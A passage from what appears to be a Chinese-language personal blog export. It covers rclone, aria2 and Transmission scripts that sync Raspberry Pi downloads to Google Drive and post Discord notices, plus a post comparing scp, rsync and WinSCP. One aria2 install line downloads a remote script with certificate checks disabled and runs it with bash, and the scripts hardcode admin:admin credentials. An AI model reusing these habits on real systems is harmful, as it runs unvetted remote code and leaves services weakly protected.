18:19<br>→ thousandday: 個人認為rclone sync夠用了 Checksum很花時間和效能 05/29 18:20<br>→ thousandday: 檔案如果多又大 好幾TB會跑到天荒地老<br><a href=\"https://www.ptt.cc/bbs/Free_box/M.1527420602.A.819.html\" target=\"_blank\" rel=\"noopener\">[工具] 自製本機與google drive檔案md5比對工具 - 看板 Free_box - 批踢踢實業坊</a></p>\n</blockquote>\n<p>我後來加<code>--size-only</code><br>覺得應該不會這麼衰…<br>不然好幾GB都卡很久</p>\n<h3 id=\"aria2-不建議使用\"><a href=\"#aria2-不建議使用\" class=\"headerlink\" title=\"aria2(不建議使用)\"></a>aria2(不建議使用)</h3><p>除非你想用…</p>\n<p>安裝方法<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">wget -N --no-check-certificate https://raw.githubusercontent.com/ToyoDAdoubiBackup/doubi/master/aria2.sh &amp;&amp; chmod +x aria2.sh &amp;&amp; bash aria2.sh</span><br></pre></td></tr></table></figure></p>\n<p><a href=\"https://doubibackup.com/zuigoj__.html?fbclid=IwAR22FvWyZjXt8qwW2IQfYGOPbmewh6kyRpqvxSX3Zd0aWKJQAx1p777hOCo\" target=\"_blank\" rel=\"noopener\">『原创』BT/种子/磁力链接下载工具 —— Aria2 一键安装管理脚本 | 逗比根据地</a><br>但說真的這個腳本整合超好的</p>\n<p>幫我同學用的<br>結果用別人 Script 搬到 rclone 不能正常<br>所以自己改寫，可能有 bug<br>請自行修</p>\n<p>有看到 *.aria2 檔案有刪除<br>重開機有時候回重新載(然後aira2檔案又會出現…)<br>不知道是不是用 aria2 會有這樣問題?</p>\n<p>$3 不是傳資料夾位址<br>所以在查哪個資料夾會不太方便<br>所以檔案一定要下載在 downloadpath 才會做上傳動作</p>\n<p>Script 是參考這個網站<br>但好像連不到了(在我寫這篇前幾天掛掉…)<br><a href=\"https://webcache.googleusercontent.com/search?q=cache:f9-JvXWtHC0J:https://blog.codesofun.com/aria2-rclone-faq.html+&amp;cd=7&amp;hl=zh-TW&amp;ct=clnk&amp;gl=tw&amp;client=firefox-b-d\" target=\"_blank\" rel=\"noopener\">使用 Aria2 + rclone 遇到的一些问题 | 代码真香</a><br>備份到 <a href=\"https://next.plnkr.co/edit/DOfCgSvBCebpklXE?preview\" target=\"_blank\" rel=\"noopener\">Plunker - demo script</a><br>Youtube 還活著 <a href=\"https://www.youtube.com/channel/UCmlhPmTdqYhRWwWZWSIBwGw?feature=embeds_subscribe_title\" target=\"_blank\" rel=\"noopener\">代码真香 - YouTube</a></p>\n<p>目前 $3 是傳第一個檔案內容<br>這邊就跟 tranmission 不太一樣，tranmission 給的參數比較完整<br>發現原 Script 會複製全部目錄到 rclone 去<br>這樣多線程下載的檔案會有問題<br>所以依照來看，舊的 Script 應該是 <strong>1線程</strong> 下載 (它裡面網頁沒寫…，不過看他網頁寫 VPS 10GB 看來是有可能的….)</p>\n<p>因為我不熟 shell ，以下用的出事不要找我XD</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">filepath=<span class=\"variable\">$3</span>\t <span class=\"comment\">#取文件原始路径，如果是单文件则为/Download/a.mp4，如果是文件夹则该值为文件夹内第一个文件比如/Download/a/1.mp4</span></span><br><span class=\"line\">path=<span class=\"variable\">$&#123;3%/*&#125;</span>\t <span class=\"comment\">#取文件根路径，如把/Download/a/1.mp4变成/Download/a</span></span><br><span class=\"line\">downloadpath=<span class=\"string\">'/media/download'</span>\t<span class=\"comment\">#Aria2下载目录</span></span><br><span class=\"line\">name=<span class=\"string\">'gdrive'</span> <span class=\"comment\">#配置Rclone时的name</span></span><br><span class=\"line\">folder=<span class=\"string\">'/test2'</span>\t <span class=\"comment\">#网盘里的文件夹，如果是根目录直接留空</span></span><br><span class=\"line\">MinSize=<span class=\"string\">'10k'</span>\t <span class=\"comment\">#限制最低上传大小，默认10k，BT下载时可防止上传其他无用文件。会删除文件，谨慎设置。</span></span><br><span class=\"line\">MaxSize=<span class=\"string\">'15G'</span>\t <span class=\"comment\">#限制最高文件大小，默认15G，OneDrive上传限制。</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ <span class=\"variable\">$2</span> -eq 0 ]; <span class=\"keyword\">then</span> <span class=\"built_in\">exit</span> 0; <span class=\"keyword\">fi</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [ `dirname <span class=\"string\">\"<span class=\"variable\">$filepath</span>\"</span>` =  <span class=\"string\">\"<span class=\"variable\">$downloadpath</span>\"</span> ] &amp;&amp; [ <span class=\"variable\">$2</span> -eq 1 ]\t<span class=\"comment\">#如果下载的是单个文件</span></span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"enter 1\"</span> </span><br><span class=\"line\">    rclone move -v <span class=\"string\">\"<span class=\"variable\">$filepath</span>\"</span> <span class=\"variable\">$&#123;name&#125;</span>:<span class=\"variable\">$&#123;folder&#125;</span> --min-size <span class=\"variable\">$MinSize</span> --max-size <span class=\"variable\">$MaxSize</span></span><br><span class=\"line\">    rm -vf <span class=\"string\">\"<span class=\"variable\">$filepath</span>\"</span>.aria2\t<span class=\"comment\">#删除残留的.aria.2文件</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> result: $?</span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 0</span><br><span class=\"line\"><span class=\"keyword\">elif</span> [[ <span class=\"string\">\"<span class=\"variable\">$path</span>\"</span> =~ ^<span class=\"string\">\"<span class=\"variable\">$downloadpath</span>\"</span> ]]\t<span class=\"comment\">#如果下载的是文件夹</span></span><br><span class=\"line\">    <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"enter 2\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> path_length <span class=\"variable\">$&#123;#path&#125;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    a=<span class=\"variable\">$downloadpath</span></span><br><span class=\"line\">    b=<span class=\"string\">\"<span class=\"variable\">$filepath</span>\"</span></span><br><span class=\"line\">    c=<span class=\"variable\">$&#123;b#$a/&#125;</span></span><br><span class=\"line\">    d=<span class=\"variable\">$&#123;c%%/*&#125;</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> d = <span class=\"variable\">$d</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$path</span>/<span class=\"variable\">$d</span>/</span><br><span class=\"line\"></span><br><span class=\"line\">    rclone move -v <span class=\"string\">\"<span class=\"variable\">$downloadpath</span>/<span class=\"variable\">$d</span>/\"</span> <span class=\"variable\">$&#123;name&#125;</span>:/<span class=\"variable\">$&#123;folder&#125;</span>/<span class=\"string\">\"<span class=\"variable\">$&#123;d&#125;</span>\"</span> --min-size <span class=\"variable\">$MinSize</span> --max-size <span class=\"variable\">$MaxSize</span> --delete-empty-src-dirs</span><br><span class=\"line\">    <span class=\"comment\">#rclone delete -v \"$downloadpath/$d/\" --max-size $MinSize\t#删除多余的文件</span></span><br><span class=\"line\">    <span class=\"comment\">#rclone rmdirs -v \"$downloadpath/$d/\" --leave-root\t#删除空目录，--delete-empty-src-dirs 参数已实现，加上无所谓。</span></span><br><span class=\"line\">    rm -vf <span class=\"string\">\"<span class=\"variable\">$downloadpath</span>/<span class=\"variable\">$d</span>\"</span>.aria2\t<span class=\"comment\">#删除残留的.aria2文件</span></span><br><span class=\"line\">    rmdir <span class=\"string\">\"<span class=\"variable\">$downloadpath</span>/<span class=\"variable\">$d</span>\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> result: $?</span><br><span class=\"line\">    <span class=\"built_in\">exit</span> 0</span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>\n<p>a=”123”<br>b=”123/4/125/1236”<br>c=${b#$a/}<br>d=${c%%/*}</p>\n<p><a href=\"https://blog.csdn.net/jiezi2016/article/details/79649382\" target=\"_blank\" rel=\"noopener\">shell中#<em>,##</em>,#<em>,##</em>,% <em>,%% </em>的含义及用法 - jiezi2016的博客 - CSDN博客</a></p>\n<h2 id=\"參考來源\"><a href=\"#參考來源\" class=\"headerlink\" title=\"參考來源\"></a>參考來源</h2><ul>\n<li><a href=\"https://ymgblog.com/2018/03/09/296/\" target=\"_blank\" rel=\"noopener\">Linux下rclone简单教程(支持VPS数据同步,多种网盘,支持挂载) | 半醉浮生丶</a></li>\n<li><a href=\"https://www.jeffgeerling.com/blog/2019/raspberry-pi-microsd-card-performance-comparison-2019\" target=\"_blank\" rel=\"noopener\">Raspberry Pi microSD card performance comparison - 2019 | Jeff Geerling</a></li>\n<li><a href=\"https://zhuanlan.zhihu.com/p/31004760\" target=\"_blank\" rel=\"noopener\">树莓派raspberrypi3打造homeassistant+homebridge智能家居中心（homekit） - 知乎</a></li>\n<li><a href=\"https://raspberrypi.stackexchange.com/questions/63586/how-to-set-vnc-security-settings-using-ssh-no-security-types-supported-server\" target=\"_blank\" rel=\"noopener\">raspbian - How to set VNC security settings using SSH? <code>No security types supported. Server sent security types, but we do not support any of them</code> - Raspberry Pi Stack Exchange</a></li>\n<li><a href=\"https://www.moerats.com/archives/877/\" target=\"_blank\" rel=\"noopener\">解决Rclone挂载Google Drive时上传失败和内存占用高等问题 - Rat’s Blog</a></li>\n<li><a href=\"https://blog.e9china.net/lesson/liyongaria2nginxrclonewanchengwuxiandianyingyingpan.html\" target=\"_blank\" rel=\"noopener\">利用Aria2+Nginx+rclone完成无限电影硬盘 | Sandy’Blog</a></li>\n<li><a href=\"https://wijtb.nctu.me/archives/153/\" target=\"_blank\" rel=\"noopener\">Plex + Rclone 掛載 Google drive 搭建多媒體伺服器 - WIJ Blog</a></li>\n<li><a href=\"https://ak77now.pixnet.net/blog/post/45722625-mount-google-drive-on-nas-with-rclone\" target=\"_blank\" rel=\"noopener\">[筆記]將Google Drive掛載到NAS上(用rclone) @ 老電影下載 [ Old Movies ] :: 痞客邦 ::</a></li>\n<li><a href=\"https://blog.rhilip.info/archives/874/\" target=\"_blank\" rel=\"noopener\">使用 rclone 在 Windows 下挂载 Google 个人 / 团队云盘 - R 酱小窝</a></li>\n<li><a href=\"https://www.zrj96.com/post-520.html\" target=\"_blank\" rel=\"noopener\">【转载】Rclone: 超好用的网盘 / VPS 数据同步、备份工具，支持 Google Drive | 初行博客</a></li>\n<li><a href=\"https://p3terx.com/archives/rclone-advanced-user-manual-common-command-parameters.html\" target=\"_blank\" rel=\"noopener\">Rclone 进阶使用教程：常用命令参数详解 - P3TERX ZONE - Zhuangbility &amp; Technology</a></li>\n<li><a href=\"https://www.ptt.cc/bbs/Free_box/M.1529958022.A.295.html\" target=\"_blank\" rel=\"noopener\">[心得] Rclone Browser教學 - 看板 Free_box - 批踢踢實業坊</a></li>\n<li><a href=\"https://www.screenly.io/blog/2017/07/02/how-to-automatically-turn-off-and-on-your-monitor-from-your-raspberry-pi/\" target=\"_blank\" rel=\"noopener\">Screenly - How to automatically turn off and on your monitor from your Raspberry Pi</a></li>\n<li><a href=\"https://asmcn.icopy.site/awesome/awesome-raspberry-pi/\" target=\"_blank\" rel=\"noopener\">Raspberry Pi - 超赞合集 awesome list chinese</a></li>\n<li><a href=\"https://github.com/ronggang/transmission-web-control/wiki/About-script-torrent-done-filename\" target=\"_blank\" rel=\"noopener\">About script torrent done filename · ronggang/transmission-web-control Wiki</a></li>\n<li><a href=\"https://github.com/transmission/transmission/wiki/Scripts\" target=\"_blank\" rel=\"noopener\">Scripts · transmission/transmission Wiki</a></li>\n<li><a href=\"https://learn-house.idv.tw/?p=2340\" target=\"_blank\" rel=\"noopener\">LearnHouse » Blog Archive » [Raspberry Pi 3]開機自動掛載 USB 隨身碟或外接硬碟</a></li>\n<li><a href=\"https://hackmd.io/@Pingu/SyZ1Pq7mQ/https%3A%2F%2Fhackmd.io%2Fs%2FSyP9NaGpm%23?type=book\" target=\"_blank\" rel=\"noopener\">伺服器架設/防火牆建置 - HackMD</a></li>\n<li><a href=\"http://blog.ipushs.com/codeigniter%e7%94%a8chromephp%e4%be%86debugphp/\" target=\"_blank\" rel=\"noopener\">CodeIgniter用ChromePHP來debug[PHP] | 敲敲打打的生活</a></li>\n<li><a href=\"https://stackoverflow.com/questions/49513335/bash-wait-exit-on-error-code\" target=\"_blank\" rel=\"noopener\">bash wait exit on error code - Stack Overflow</a></li>\n<li><a href=\"https://medium.com/@artur.klauser/mounting-google-drive-on-raspberry-pi-f5002c7095c2\" target=\"_blank\" rel=\"noopener\">Mounting Google Drive on Raspberry Pi - Artur Klauser - Medium</a></li>\n<li><a href=\"https://0xhack.wordpress.com/2019/02/27/google-drive-%E7%9B%B8%E4%BA%92%E8%A4%87%E8%A3%BD-%E5%B0%8D%E6%8B%B7/\" target=\"_blank\" rel=\"noopener\">Google Drive 相互複製 對拷 – BunnyBit 比特小兔兔</a></li>\n<li><a href=\"https://rclone.org/docs/#bwlimit-bandwidth-spec\" target=\"_blank\" rel=\"noopener\">Documentation</a> 限速??待確認</li>\n</ul>\n<h2 id=\"AT-排成設定\"><a href=\"#AT-排成設定\" class=\"headerlink\" title=\"AT 排成設定\"></a>AT 排成設定</h2><p><strong>2020-07-23</strong></p>\n<p>設定時間排程 at<br>Raspberry Pi 預設沒有安裝<br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">sudo apt install at</span><br><span class=\"line\">at :time </span><br><span class=\"line\"><span class=\"comment\"># at -l = atq</span></span><br><span class=\"line\">atq</span><br><span class=\"line\"><span class=\"comment\"># atrm jobid</span></span><br><span class=\"line\">at now + 5 minutes</span><br></pre></td></tr></table></figure></p>\n<p>中斷結束 Ctrl + D</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">at 04:00 </span><br><span class=\"line\">at 04:00 2015-07-30</span><br></pre></td></tr></table></figure>\n<p>TIME：時間格式，這裡可以定義出『什麼時候要進行 at 這項工作』的時間，格式有：<br>  HH:MM                ex&gt; 04:00<br>    在今日的 HH:MM 時刻進行，若該時刻已超過，則明天的 HH:MM 進行此工作。<br>  HH:MM YYYY-MM-DD        ex&gt; 04:00 2015-07-30<br>    強制規定在某年某月的某一天的特殊時刻進行該工作！</p>\n<p><a href=\"https://linux.die.net/man/1/transmission-remote\" target=\"_blank\" rel=\"noopener\">transmission-remote(1) - Linux man page</a><br>開始所有 torrent 下載</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">transmission-remote --auth=admin:admin   -tall --start</span><br></pre></td></tr></table></figure>\n<p>停止所有 torrent 下載<br><figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">transmission-remote --auth=admin:admin   -tall --stop</span><br></pre></td></tr></table></figure></p>\n<p><strong>20200808</strong><br>更新放置路徑可用多重路徑同步</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#!/bin/bash</span></span><br><span class=\"line\"></span><br><span class=\"line\">DSCORD_WEBHOOK=<span class=\"string\">\"https://discordapp.com/api/webhooks/*\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">function</span> <span class=\"function\"><span class=\"title\">sendDiscordNotice</span></span>()&#123;</span><br><span class=\"line\">        <span class=\"built_in\">local</span> MSG=<span class=\"variable\">$2</span></span><br><span class=\"line\">        <span class=\"comment\"># echo $MSG</span></span><br><span class=\"line\">        <span class=\"built_in\">local</span> URL=<span class=\"variable\">$1</span></span><br><span class=\"line\">        curl -H <span class=\"string\">\"Content-Type: application/json\"</span> \\</span><br><span class=\"line\">        -X POST \\</span><br><span class=\"line\">        -d <span class=\"string\">\"&#123;\\\"username\\\": \\\"system\\\", \\\"content\\\": \\\"<span class=\"variable\">$&#123;MSG&#125;</span>\\\"&#125;\"</span> <span class=\"variable\">$URL</span></span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#sendDiscordNotice $DSCORD_WEBHOOK \"test\"</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 需要做同步的路徑，結尾資料夾不用/</span></span><br><span class=\"line\">LOCAL_SYNCDIR=<span class=\"string\">\"/mnt/extHDD/Download\"</span></span><br><span class=\"line\"><span class=\"comment\"># RCLONE 結尾不能有 /</span></span><br><span class=\"line\">RCLONE_SYNCDIR=<span class=\"string\">\"gdrive:/test\"</span></span><br><span class=\"line\"><span class=\"comment\"># 注意需要看.config/rclone 資料夾和檔案權限，需要到rx</span></span><br><span class=\"line\">RCLONE_CONFIG_PATH=<span class=\"string\">\"--config=/home/pi/.config/rclone/rclone.conf\"</span></span><br><span class=\"line\">AUTH=<span class=\"string\">\"--auth admin:admin\"</span></span><br><span class=\"line\">REPLATE_PATH=<span class=\"variable\">$&#123;TR_TORRENT_DIR#\"$&#123;LOCAL_SYNCDIR&#125;</span><span class=\"string\">\"/&#125;  </span></span><br><span class=\"line\"><span class=\"string\">#### debug end</span></span><br><span class=\"line\"><span class=\"string\">df -H | grep -vE '^Filesystem|tmpfs|cdrom|udev|已用' | awk '&#123; print <span class=\"variable\">$5</span> \"</span> <span class=\"string\">\" <span class=\"variable\">$1</span> &#125;' | while read output;</span></span><br><span class=\"line\"><span class=\"string\">do</span></span><br><span class=\"line\"><span class=\"string\">  usep=<span class=\"variable\">$(echo $output | awk '&#123; print $1&#125;' | cut -d'%' -f1  )</span></span></span><br><span class=\"line\"><span class=\"string\">  partition=<span class=\"variable\">$(echo $output | awk '&#123; print $2 &#125;' )</span></span></span><br><span class=\"line\"><span class=\"string\">  if [ <span class=\"variable\">$usep</span> -ge 80 ]; then</span></span><br><span class=\"line\"><span class=\"string\">    sendDiscordNotice <span class=\"variable\">$DSCORD_WEBHOOK</span> \"</span>⚠️注意快超出硬碟空間\\\\\\<span class=\"string\">\"<span class=\"variable\">$partition</span>\\\\\\\" (<span class=\"variable\">$usep</span>%) on <span class=\"variable\">$(hostname)</span> as on <span class=\"variable\">$(date)</span>\"</span></span><br><span class=\"line\">  <span class=\"keyword\">fi</span></span><br><span class=\"line\"><span class=\"keyword\">done</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span> [[ <span class=\"string\">\"<span class=\"variable\">$TR_TORRENT_DIR</span>\"</span> =~ ^<span class=\"string\">\"<span class=\"variable\">$LOCAL_SYNCDIR</span>\"</span> ]]; <span class=\"keyword\">then</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"string\">\"pass\"</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ -f <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        flock -x  /tmp/rclone.lock rclone copy <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;RCLONE_SYNCDIR&#125;</span>/<span class=\"variable\">$&#123;REPLATE_PATH&#125;</span>\"</span></span><br><span class=\"line\">        rclone check <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;RCLONE_SYNCDIR&#125;</span>/<span class=\"variable\">$&#123;REPLATE_PATH&#125;</span>\"</span></span><br><span class=\"line\">    <span class=\"keyword\">else</span> </span><br><span class=\"line\">        flock -x  /tmp/rclone.lock rclone copy <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$&#123;RCLONE_SYNCDIR&#125;</span>/<span class=\"variable\">$&#123;REPLATE_PATH&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span></span><br><span class=\"line\">        rclone check <span class=\"variable\">$&#123;RCLONE_CONFIG_PATH&#125;</span> <span class=\"string\">\"<span class=\"variable\">$&#123;TR_TORRENT_DIR&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> <span class=\"string\">\"<span class=\"variable\">$RCLONE_SYNCDIR</span>/<span class=\"variable\">$&#123;REPLATE_PATH&#125;</span>/<span class=\"variable\">$&#123;TR_TORRENT_NAME&#125;</span>\"</span> --size-only</span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">if</span> [ $? -eq 0 ]; <span class=\"keyword\">then</span></span><br><span class=\"line\">        msg=<span class=\"string\">\"✅ <span class=\"variable\">$TR_TORRENT_NAME</span> 完成下載，並完成同步\"</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$msg</span></span><br><span class=\"line\">        sendDiscordNotice <span class=\"variable\">$DSCORD_WEBHOOK</span> <span class=\"string\">\"<span class=\"variable\">$msg</span>\"</span></span><br><span class=\"line\">        transmission-remote <span class=\"variable\">$AUTH</span> -t <span class=\"variable\">$TR_TORRENT_ID</span> --remove-and-delete</span><br><span class=\"line\">    <span class=\"keyword\">else</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"string\">\"FAIL\"</span></span><br><span class=\"line\">        msg=<span class=\"string\">\"⚠️ <span class=\"variable\">$TR_TORRENT_NAME</span> 完成下載，但同步失敗\"</span></span><br><span class=\"line\">        <span class=\"built_in\">echo</span> <span class=\"variable\">$msg</span></span><br><span class=\"line\">        sendDiscordNotice <span class=\"variable\">$DSCORD_WEBHOOK</span> <span class=\"string\">\"<span class=\"variable\">$msg</span>\"</span></span><br><span class=\"line\">    <span class=\"keyword\">fi</span></span><br><span class=\"line\">    </span><br><span class=\"line\"><span class=\"keyword\">else</span></span><br><span class=\"line\">    msg=<span class=\"string\">\"✅<span class=\"variable\">$TR_TORRENT_NAME</span> 完成下載，不需要做同步\"</span></span><br><span class=\"line\">    <span class=\"built_in\">echo</span> <span class=\"variable\">$msg</span></span><br><span class=\"line\">    sendDiscordNotice <span class=\"variable\">$DSCORD_WEBHOOK</span> <span class=\"string\">\"<span class=\"variable\">$msg</span>\"</span></span><br><span class=\"line\"><span class=\"keyword\">fi</span></span><br></pre></td></tr></table></figure>","categories":["Linux"],"tags":["linux","rclone","gdrive"]},{"title":"scp,rsync,winscp使用小記和同部備份方法","url":"/blog/2019/03/23/scp-rsync-winscp%E4%BD%BF%E7%94%A8%E5%B0%8F%E8%A8%98%E5%92%8C%E5%90%8C%E9%83%A8%E5%82%99%E4%BB%BD%E6%96%B9%E6%B3%95/","content":"<p>最近想同步檔案道別台機器<br>想比較 scp,rsync,winscp 有什麼同步的方法<br>比較一下差異</p>\n<a id=\"more\"></a>\n<h2 id=\"scp\"><a href=\"#scp\" class=\"headerlink\" title=\"scp\"></a>scp</h2><p>之前有寫過這篇<a href=\"https://malagege.github.io/blog/2018/04/16/scp%E8%B7%9Fsftp%E6%98%AF%E4%B8%8D%E6%A8%A3%E7%9A%84%E6%9D%B1%E8%A5%BF/\">scp 跟 sftp 是不一樣的東西 | 程式狂想筆記</a><br>所以這個沒有辦法跟 rysnc 一樣判斷同步<br>但有加密功能<br>使用也很簡單，不需要先 ssh 別台主機<br>直接 command 使用<code>scp xxx@ooo:xxx fff@bbb:xxx</code><br>不過路徑可能要清楚是哪邊</p>\n<p>複製資料夾除了用*方式<br>但用星號無法多層<br>要使用<code>-r</code> Recursively copy entire directories<br><code>scp -r user@your.server.example.com:/path/to/foo /home/user/Desktop/</code><br><a href=\"https://stackoverflow.com/questions/11304895/how-to-copy-a-folder-from-remote-to-local-using-scp\" target=\"_blank\" rel=\"noopener\">shell - How to copy a folder from remote to local using scp? - Stack Overflow</a></p>\n<h2 id=\"rsync\"><a href=\"#rsync\" class=\"headerlink\" title=\"rsync\"></a>rsync</h2><p><del>跟 scp 差別預設沒有加密，但還是有辦法做加密。</del><br>剛看了一下別的文章<br>2004 年後預設說有做 ssh 加密<br>難怪我有看到有些說預設有 ssh 加密，有些沒有…<br>可參考<a href=\"https://unix.stackexchange.com/questions/312358/rsync-e-option-to-ssh\" target=\"_blank\" rel=\"noopener\">Rsync -e option to ssh - Unix &amp; Linux Stack Exchange</a></p>\n<blockquote>\n<p>Assuming you’re not needing to consider the rsync protocol itself, this depends on the compilation options used for your version of rsync.<br>It used to be the case that rsync used the rsh protocol by default (unless the build-time default had been changed), but the build-time default changed to ssh in 2004.<br>If you’re in doubt, start the rsync process transferring a relatively large file (or collection of files), and in another terminal run ps -ef | grep [r]sync. This will show you whether or not you’re using ssh for a transport. Here’s an example from one of my servers, which clearly shows the ssh transport:</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&gt; root     28057 27173  1 09:48 pts/4    00:00:00 rsync -avHP --dry-run /home roaima@otherserver:</span><br><span class=\"line\">&gt; root     28058 28057  0 09:48 pts/4    00:00:00 ssh -l roaima otherserver rsync --server -vnlHogDtpre.iLsfx --partial . .</span><br><span class=\"line\">&gt;</span><br></pre></td></tr></table></figure>\n</blockquote>\n<blockquote>\n<p>Finally, be aware that the compilation default can be overridden with the RSYNC_RSH environment variable. (See the man page for further details.)</p>\n</blockquote>\n<p>有時間在驗證上面到底有沒有加密</p>\n<p>他有很多參數<br>目前我常用是用<code>-av</code>，不過是先前前輩給我用的設定<br>我還沒搞清楚</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">-a, --archive 歸檔模式，表示以遞歸方式傳輸文件，並保持所有文件屬性，等於-rlptgoD</span><br><span class=\"line\">-v, --verbose 詳細模式輸出</span><br><span class=\"line\">--delete 刪除那些目標目錄中有而源目錄中沒有的多餘文件。這個是 rsync 做增量方式的全備份的最佳選擇方案！！！！！！</span><br><span class=\"line\">簡單說加入`--delete`就是本基做刪除動作，但是遠端就會**做刪除**</span><br><span class=\"line\">反之，沒家的話就不會。</span><br></pre></td></tr></table></figure>\n<p>詳細記紹可以看<br><a href=\"https://www.cnblogs.com/kevingrace/p/8529792.html\" target=\"_blank\" rel=\"noopener\">SCP 和 Rsync 遠程拷貝的幾個技巧 - 散盡浮華 - 博客園</a> <a href=\"/blog/2019/03/23/scp-rsync-winscp使用小記和同部備份方法/1.png\" title=\"備份圖\">備份圖</a><br><a href=\"https://www.jianshu.com/p/52aa5c2b872a\" target=\"_blank\" rel=\"noopener\">SSH,SCP,rsync,sftp - 简书</a> <a href=\"/blog/2019/03/23/scp-rsync-winscp使用小記和同部備份方法/2.png\" title=\"備份圖\">備份圖</a></p>\n<p>不過 window 就算有裝 git bash，但預設沒有 rsync 可以用<br>所以我才會找找有沒有類似在 window winscp 做同步更新方法<br>當然我也有找到 window 能用 rsync<br><a href=\"https://chocolatey.org/packages/rsync\" target=\"_blank\" rel=\"noopener\">Chocolatey Gallery | cwRsync (Free Edition) 5.5.0.20190204</a><br><a href=\"https://marketplace.visualstudio.com/items?itemName=vscode-ext.sync-rsync&amp;ssr=false#overview\" target=\"_blank\" rel=\"noopener\">Sync-Rsync - Visual Studio Marketplace</a></p>\n<p><strong>2020-04-23</strong><br><figure class=\"highlight bash\"><table><tr><td class=\"code\"><pre><span class=\"line\">rsync –av /etc server1:/tmp <span class=\"comment\"># 複製目錄和目錄下文件</span></span><br><span class=\"line\">rsync –av /etc/ server1:/tmp <span class=\"comment\"># 只複製目錄下文件</span></span><br><span class=\"line\">rsync -avh myfile.gz /home/pi/tmp/ <span class=\"comment\"># 複製檔案到資料夾</span></span><br><span class=\"line\">rsync -avzh pi@192.168.1.12:/mypath/myfile.gz /mybackup/</span><br><span class=\"line\">rsync -avzh --bwlimit=100K pi@192.168.1.12:/mypath/myfile.gz /mybackup/ <span class=\"comment\"># --bwlimit 限制頻寬</span></span><br></pre></td></tr></table></figure></p>\n<blockquote>\n<p>-n 模擬複製過程<br>-v 顯示詳細過程<br><strong>-r 遞歸複製目錄樹</strong><br><strong>-p 保留權限</strong><br><strong>-t 保留時間戳</strong><br><strong>-g 保留組信息</strong><br><strong>-o 保留所有者信息</strong><br><strong>-l 將軟鏈接文件本身進行複製（默認）</strong><br>-L 將軟鏈接文件指向的文件複製<br>-a 存檔，相當於–rlptgoD，但不保留ACL（-A）和SELinux屬性（-X）<br>–delete  如果沒有來源檔案只有新增、沒有減少的話，它就跟一般的複製<br>-h：將數字以比較容易閱讀的格式輸出。</p>\n</blockquote>\n<h2 id=\"WinSCP\"><a href=\"#WinSCP\" class=\"headerlink\" title=\"WinSCP\"></a>WinSCP</h2><p>內建也有做同步功能<br><a href=\"https://winscp.net/eng/docs/scripting\" target=\"_blank\" rel=\"noopener\">Scripting and Task Automation :: WinSCP</a><br><a href=\"https://winscp.net/eng/docs/ui_synchronize\" target=\"_blank\" rel=\"noopener\">Synchronize Dialog :: WinSCP</a></p>\n<p>其他參考來源:<br><a href=\"https://www.cnblogs.com/kevingrace/p/8529792.html\" 